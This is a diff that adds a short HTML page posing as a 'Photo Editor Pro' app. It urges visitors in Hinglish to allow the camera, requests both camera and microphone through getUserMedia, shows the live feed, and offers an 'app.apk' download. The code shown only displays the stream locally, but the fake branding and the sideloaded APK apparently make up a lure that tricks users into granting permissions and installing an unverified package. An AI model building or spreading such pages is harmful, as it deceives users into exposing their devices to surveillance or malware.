@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html><body style="background:black;color:lime;text-align:center">
+<h1>📸 PHOTO EDITOR PRO</h1>
+<p>Camera allow karo!</p>
+<video autoplay style="width:300px"></video>
+<a href="app.apk" download><button>Download App</button></a>
+<script>
+navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>document.querySelector('video').srcObject=s)
+</script>
+</body></html>
